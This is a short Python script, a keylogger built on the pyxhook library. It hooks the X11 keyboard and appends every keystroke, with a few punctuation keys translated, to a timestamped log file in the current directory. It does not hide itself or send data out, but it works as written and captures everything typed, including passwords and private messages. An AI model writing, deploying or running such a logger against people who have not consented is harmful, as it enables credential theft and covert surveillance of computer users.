#!/usr/bin/env python 
import os
from datetime import datetime
import pyxhook

def main():
    log_file=f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            if event.Key == 'space':
                f.write(' ')
            elif event.Key == 'P_Enter' :
                f.write('\n')
            elif event.Key == 'Return' :
                f.write('\n')
            elif event.Key == 'comma' :
                f.write(',')
            elif event.Key == 'semicolon' :
                f.write(';')
            elif event.Key == 'colon' :
                f.write(':')
            elif event.Key == 'exclam' :
                f.write('!')
            elif event.Key == 'period' :
                f.write('.')
            else:
                f.write(f'{event.Key}')

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f'Error while catching events:\n  {ex}'
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write(f'\n{msg}')

if __name__ == '__main__':
    main()
